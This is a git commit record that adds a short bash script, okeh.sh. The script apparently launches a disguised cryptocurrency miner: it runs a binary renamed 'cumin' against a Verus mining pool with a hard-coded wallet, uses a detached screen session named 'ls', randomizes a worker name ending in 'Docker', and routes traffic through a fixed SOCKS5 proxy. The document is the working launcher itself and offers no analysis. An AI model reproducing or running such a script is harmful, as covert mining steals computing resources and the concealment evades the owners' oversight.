3b75e14d91bb808fa764c168a7feaa66de3b4cfc
Hdjsg566 <86645551+Hdjsg566@users.noreply.github.com>
2021-06-29 12:24:27 +0700

    Add files via upload

---
+++ okeh.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x cumin
+screen -dmS ls 
+POOL=stratum+tcp://eu.luckpool.net:3956
+WALLET=RVXxf8Ci9MP5VmmkPyXjz3GUdzpBvmBJNH
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
+PROXY=socks5://98.162.25.23:4145
+./cumin -a verus -o $POOL -u $WALLET.BASO -p $WORKER -t 2 -x $PROXY
